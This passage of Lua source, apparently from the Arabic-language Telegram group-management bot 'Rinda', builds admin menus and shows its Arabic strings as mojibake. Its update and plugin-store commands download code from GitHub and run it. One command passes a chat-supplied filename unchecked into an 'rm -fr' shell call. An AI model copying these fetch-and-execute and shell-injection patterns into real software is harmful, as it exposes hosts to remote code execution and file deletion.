keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(msg) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Del or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุณุญ ูุงุฆูู ุงูููุน" and RioConstructor(msg) then
local Filter = DevRio:get(Rinda..'Rio:Filter')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูููุน โขโฏ
-----------------------------------------
*โ๏ธฐููููู ูุณุญ ุงูููููุนุงุช ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุชุญุฑูุงุช โข",callback_data="/DelGif:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูููุตูุงุช โข",callback_data="/DelSticker:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูุตูุฑ โข",callback_data="/DelPhoto:"..msg.sender_user_id_},{text="โข ูุณุญ ุงููููุงุช โข",callback_data="/DelTextfilter:"..msg.sender_user_id_}},{{text="โข ูุณุญ ููุงุฆู ุงูููุน โข",callback_data="/DelAllFilter:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Filter or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text == "ููู" or text == "ุงูููู" or text == "ููู" or text == "ูุชุญ" or text == "ุงูุงูุฑ ุงูููู" or text == "ุงูุงูุฑ ุงูููู" or text == "ุงูุงูุฑ ุงููุชุญ ู ุงูููู" then
local locklist = DevRio:get(Rinda..'Rio:locklist')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูููู ูุงููุชุญ โขโฏ
-----------------------------------------
*โ๏ธฐููููู ููู ููุชุญ ุงูุงูุงูุฑ ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ููู ุงูุฏุฑุฏุดู โข",callback_data="/lockText:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุฏุฑุฏุดู โข",callback_data="/unlockText:"..msg.sender_user_id_}},{{text="โข ููู ุงูุฏุฎูู โข",callback_data="/lockjoin:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุฏุฎูู โข",callback_data="/unlockjoin:"..msg.sender_user_id_}},{{text="โข ููู ุงูุจูุชุงุช โข",callback_data="/LockBotList:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุจูุชุงุช โข",callback_data="/unlockBot:"..msg.sender_user_id_}},{{text="โข ููู ุงูุงุดุนุงุฑุงุช โข",callback_data="/lockTagServr:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุงุดุนุงุฑุงุช โข",callback_data="/unlockTagServr:"..msg.sender_user_id_}},{{text="โข ููู ุงูุชุนุฏูู โข",callback_data="/lockEditMsgs:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุชุนุฏูู โข",callback_data="/unlockEditMsgs:"..msg.sender_user_id_}},{{text="โข ููู ุงูููุตูุงุช โข",callback_data="/lockStickers:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูููุตูุงุช โข",callback_data="/unlockStickers:"..msg.sender_user_id_}},{{text="โข ููู ุงููุชุญุฑูู โข",callback_data="/lockGifs:"..msg.sender_user_id_},{text="โข ูุชุญ ุงููุชุญุฑูู โข",callback_data="/unlockGifs:"..msg.sender_user_id_}},{{text="โข ููู ุงูููุฏูู โข",callback_data="/lockVideos:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูููุฏูู โข",callback_data="/unlockVideos:"..msg.sender_user_id_}},{{text="โข ููู ุงูุตูุฑ โข",callback_data="/unlockPhoto:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุตูุฑ โข",callback_data="/unlockPhoto:"..msg.sender_user_id_}},{{text="โข ููู ุงูุชูุฌูู โข",callback_data="/lockForwards:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุชูุฌูู โข",callback_data="/unlockForwards:"..msg.sender_user_id_}},{{text="โข ููู ุงูุชูุฑุงุฑ โข",callback_data="/LockSpamList:"..msg.sender_user_id_},{text="โข ูุชุญ ุงูุชูุฑุงุฑ โข",callback_data="/unlockSpam:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/HelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(locklist or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text == "ุงูุชุนุทูู" or text == "ุงูุชูุนูู" or text == "ุงูุงูุฑ ุงูุชูุนูู" or text == "ุงูุงูุฑ ุงูุชุนุทูู" or text == "ุงูุงูุฑ ุงูุชูุนูู ูุงูุชุนุทูู" then
local order = DevRio:get(Rinda..'Rio:order')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุฑ ุงูุชุนุทูู ูุงูุชูุนูู โขโฏ
-----------------------------------------
โ๏ธฐููููู ุงูุชุนุทูู ูุงูุชูุนูู ุนู ุทุฑูู ุงูุงุฒุฑุงุฑ ุจูุงุณูู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู โข",callback_data="/LockIdPhoto:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู โข",callback_data="/UnLockIdPhoto:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุงูุฏู โข",callback_data="/LockId:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุฏู โข",callback_data="/UnLockId:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุงุจุท โข",callback_data="/LockGpLinks:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุงุจุท โข",callback_data="/UnLockGpLinks:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุงุจุท ุงููุงูู โข",callback_data="/LockGpLinksinline:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุงุจุท ุงููุงูู โข",callback_data="/UnLockGpLinksinline:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุชุฑุญูุจ โข",callback_data="/LockWelcome:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุชุฑุญูุจ โข",callback_data="/UnLockWelcome:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุฏูุฏ ุงููุทูุฑ โข",callback_data="/LockAllRed:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุฏูุฏ ุงููุทูุฑ โข",callback_data="/UnLockAllRed:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุฑุฏูุฏ ุงููุฏูุฑ โข",callback_data="/LockGpRed:"..msg.sender_user_id_},{text="โข ุชูุนูู ุฑุฏูุฏ ุงููุฏูุฑ โข",callback_data="/UnLockGpRed:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ูุฒููู โข",callback_data="/LockDelMe:"..msg.sender_user_id_},{text="โข ุชูุนูู ูุฒููู โข",callback_data="/UnLockDelMe:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงุทุฑุฏูู โข",callback_data="/LockKickMe:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงุทุฑุฏูู โข",callback_data="/UnLockKickMe:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุญุธุฑ โข",callback_data="/LockKickBan:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุญุธุฑ โข",callback_data="/UnLockKickBan:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑูุน โข",callback_data="/LockProSet:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุฑูุน โข",callback_data="/UnLockProSet:"..msg.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุงูุนุงุจ โข",callback_data="/LockGames:"..msg.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุนุงุจ โข",callback_data="/UnLockGames:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/HelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(order or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Cleaner(msg) then
if text == "ุงูุณุญ" then
if DevRio:get(Rinda..'Rio:Lock:Clean'..msg.chat_id_) then 
local Media = DevRio:get(Rinda..'Rio:Media')
local Text = [[
*โ๏ธฐุงุฒเขชุงเขช ุชุญฺชู ุจูููุฏูุง ูููุณุญ ุจเขชู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุฏูุง โข",callback_data="/DelMedia:"..msg.sender_user_id_},{text="โข ูุณุญ ุงูุงุบุงูู โข",callback_data="/DelMusic:"..msg.sender_user_id_}},{{text="โข ูุณุญ ุงูุฑุณุงุฆู ุงููุนุฏูู โข",callback_data="/DelMsgEdit:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Media or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุบุงุฏุฑ" and SudoBot(msg) then
local Leave = DevRio:get(Rinda..'Rio:Leave')
local Text = [[
*โ๏ธฐูุชุงูุฏ ุชเขชูุฏูู ุงุบุงุฏเขช ฺชเขชูุจู ุ*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="โข ูุง โข",callback_data="/NoLeaveBot:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Leave or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชุญุฏูุซ" and SecondSudo(msg) then
local Source = DevRio:get(Rinda..'Rio:Source')
local Text = [[
*โ๏ธฐุงุฒเขชุงเขช ุชุญุฏูุซ เขชููุฏุง ูููููุงุช ุจเขชู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุญุฏูุซ ุฑููุฏุง โข",callback_data="/UpdateSource:"..msg.sender_user_id_},{text="โข ุชุญุฏูุซ ุงููููุงุช โข",callback_data="/UpdateFile:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Source or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชูุนูู ุงูููุชููุจ' and Manager(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูููุชููุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'ุชุนุทูู ุงูููุชููุจ' and Manager(msg) then  
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูููุชููุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SecondSudo(msg) then
if text == "ุชุญุฏูุซ ุฑููุฏุง" and ChCheck(msg) or text == "ุชุญุฏูุซ ุณูุฑุณ" and ChCheck(msg) or text == "โข ุชุญุฏูุซ ุฑููุฏุง โ" and ChCheck(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุฌุงุฑู ุชุญุฏูุซ ุณูุฑุณ ุฑููุฏุง', 1, 'md') 
os.execute('rm -rf Rinda.lua') 
os.execute('wget https://raw.githubusercontent.com/RindaTeam/Rinda/master/Rinda.lua') 
dofile('Rinda.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( ุชู ุชุญุฏูุซ ุฑููุฏุง )          \n\27[0;34;49m\n") 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุชุญุฏูุซ ุงูู ุงูุงุตุฏุงุฑ ุงูุฌุฏูุฏ', 1, 'md') 
end
if text == 'ุชุญุฏูุซ ุงูุจูุช' and ChCheck(msg) or text == 'โข ุชุญุฏูุซ โ' and ChCheck(msg) then  
dofile('Rinda.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( ุชู ุชุญุฏูุซ ูููุงุช ุงูุจูุช )        \n\27[0;34;49m\n") 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุญุฏูุซ ูููุงุช ุงูุจูุช", 1, "md")
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ููู ุงูุงุญุตุงุฆูุงุช' and ChCheck(msg) or text == 'โข ููู ุงูุงุญุตุงุฆูุงุช โ' and ChCheck(msg) then
local Users = DevRio:smembers(Rinda.."User_Bot")
local Groups = DevRio:smembers(Rinda..'Chek:Groups')
local Sudos = DevRio:smembers(Rinda.."Sudo:User")
if DevRio:get(Rinda..'Name:Bot') then
DevRio:set(Rinda..'Rio:NameBot',(DevRio:get(Rinda..'Name:Bot') or 'ุฑููุฏุง'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(Rinda..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(Rinda..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(Rinda..'Rio:Groups',Groups[i]) 
if DevRio:get(Rinda.."Private:Group:Link"..Groups[i]) then
DevRio:set(Rinda.."Rio:Groups:Links"..Groups[i],DevRio:get(Rinda.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(Rinda.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(Rinda..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(Rinda.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(Rinda..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevRio:sadd(Rinda.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(Rinda..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(Rinda.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(Rinda..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(Rinda.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(Rinda..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(Rinda.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(Rinda..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(Rinda.."Rio:VipMem:"..Groups[i], v)
end
DevRio:set(Rinda.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(Rinda.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevRio:set(Rinda..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'โ๏ธฐุชู ููู โข '..#Groups..' ูุฌููุนู\nโ๏ธฐุชู ููู โข '..#Users..' ูุดุชุฑู\nโ๏ธฐูู ุงูุชุญุฏูุซ ุงููุฏูู ุงูู ุงูุชุญุฏูุซ ุงูุฌุฏูุฏ')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงููููุงุช' and ChCheck(msg) and SecondSudo(msg) then
Files = '\nโ๏ธฐุงููููุงุช ุงูููุนูู ูู ุงูุจูุช โขโฏ\n-----------------------------------------\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = 'โ๏ธฐูุง ุชูุฌุฏ ูููุงุช ูู ุงูุจูุช'
end
send(msg.chat_id_, msg.id_,Files)
end
if text and (text == "ูุชุฌุฑ ุงููููุงุช" or text == 'ุงููุชุฌุฑ' or text == 'โข  ุงููุชุฌุฑ โ') and ChCheck(msg) and SecondSudo(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/DavidTeam8/RindaFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\nโ๏ธฐูุงุฆูุฉ ูููุงุช ูุชุฌุฑ ุณูุฑุณ ุฑููุฏุง\nโ๏ธฐุงููููุงุช ุงููุชููุฑู ุญุงููุง โข โค\n-----------------------------------------\n"
local TextE = "-----------------------------------------\nโ๏ธฐุนูุงูุฉ โข (โ) ุชุนูู ุงูููู ููุนู\nโ๏ธฐุนูุงูุฉ โข (โ๏ธ) ุชุนูู ุงูููู ูุนุทู\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(โ)"
else
CheckFile = "(โ๏ธ)"
end
NumFile = NumFile + 1
TextS = TextS.."โ๏ธฐ"..Info..' โข โค\n'..NumFile.."~ : `"..name..'` โฌ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"โ๏ธฐูุง ููุฌุฏ ุงุชุตุงู ูู ุงููapi") 
end
end
if text == "ูุณุญ ุฌููุน ุงููููุงุช" and ChCheck(msg) and SecondSudo(msg) or text == "ุญุฐู ุฌููุน ุงููููุงุช" and ChCheck(msg) and SecondSudo(msg) then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"โ๏ธฐุชู ุญุฐู ุฌููุน ุงููููุงุช ุงูููุนูู")
end
if text and text:match("^(ุชุนุทูู ููู) (.*)(.lua)$") and ChCheck(msg) and SecondSudo(msg) then
local FileGet = {string.match(text, "^(ุชุนุทูู ููู) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/DavidTeam8/RindaFiles/master/RindaFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\nโ๏ธฐุงูููู โข *"..FileName.."*\nโ๏ธฐุชุนุทูู ูุญุฐูู ูู ุงูุจูุช ุถูุนู") 
dofile('Rinda.lua')  
else
send(msg.chat_id_, msg.id_,"โ๏ธฐูุง ููุฌุฏ ููู ุจูุฐุง ุงูุงุณู") 
end
end
if text and text:match("^(ุชูุนูู ููู) (.*)(.lua)$") and ChCheck(msg) and SecondSudo(msg) then
local FileGet = {string.match(text, "^(ุชูุนูู ููู) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/DavidTeam8/RindaFiles/master/RindaFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\nโ๏ธฐุงูููู โข *"..FileName.."*\nโ๏ธฐุชูุนูู ูู ุงูุจูุช ุถูุนู") 
dofile('Rinda.lua')  
else
send(msg.chat_id_, msg.id_,"โ๏ธฐูุง ููุฌุฏ ููู ุจูุฐุง ุงูุงุณู") 
end
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'ูุณุญ ูุนูููุงุช ุงูุชุฑุญูุจ') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ', 1, 'md')   
DevRio:del(Rinda..'Rio:Text:BotWelcome')
DevRio:del(Rinda..'Rio:Photo:BotWelcome')
return false
end 
if text and (text == 'ุชูุนูู ุชุฑุญูุจ ุงูุจูุช' or text == 'ุชูุนูู ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'โข ุชูุนูู ุชุฑุญูุจ ุงูุจูุช โ') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชูุนู ุงูุชุฑุญูุจ ุนูุฏ ุงุถุงูุฉ ุงูุจูุช ูู ุงููุฌููุนู', 1, 'md')   
DevRio:del(Rinda..'Rio:Lock:BotWelcome')
return false
end 
if text and (text == 'ุชุนุทูู ุชุฑุญูุจ ุงูุจูุช' or text == 'ุชุนุทูู ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'โข ุชุนุทูู ุชุฑุญูุจ ุงูุจูุช โ') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชุนุทู ุงูุชุฑุญูุจ ุนูุฏ ุงุถุงูุฉ ุงูุจูุช ูู ุงููุฌููุนู', 1, 'md')   
DevRio:set(Rinda..'Rio:Lock:BotWelcome',true)
return false
end 
if text and (text == 'ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'ุชุบููุฑ ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'โข ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ โ') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ูุต ุงูุชุฑุญูุจ', 1, 'md') 
DevRio:del(Rinda..'Rio:Text:BotWelcome')
DevRio:del(Rinda..'Rio:Photo:BotWelcome')
DevRio:set(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ", 1, "md") 
DevRio:del(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููุต ุงุฑุณู ูู ุตูุฑุฉ ุงูุชุฑุญูุจ\nโ๏ธฐุงุฑุณู โข ุงูุบุงุก ูุญูุธ ุงููุต ููุท", 1, 'md')   
DevRio:set(Rinda.."Rio:Text:BotWelcome",text) 
DevRio:set(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููุต ูุงูุบุงุก ุญูุธ ุตูุฑุฉ ุงูุชุฑุญูุจ", 1, "md") 
DevRio:del(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevRio:set(Rinda.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููุต ูุตูุฑุฉ ุงูุชุฑุญูุจ", 1, 'md')   
DevRio:del(Rinda.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุถุน ูููุดู ุงููุทูุฑ$") or text and text:match("^ูุถุน ูููุดู ุงููุทูุฑ$") or text and text:match("^ุชุบููุฑ ูููุดู ุงููุทูุฑ$") or text and text:match("^โข ุชุบููุฑ ูููุดู ุงููุทูุฑ โ$") and ChCheck(msg) then
if not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ ุงููุทูุฑ ุงูุงู ", 1, "md")
DevRio:setex(Rinda.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^ูุณุญ ูููุดู ุงููุทูุฑ$") or text and text:match("^ุญุฐู ูููุดู ุงููุทูุฑ$") then
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ูููุดุฉ ุงููุทูุฑ", 1, "md")
DevRio:del(Rinda.."DevText")
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ", 1, "md") 
DevRio:del(Rinda.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
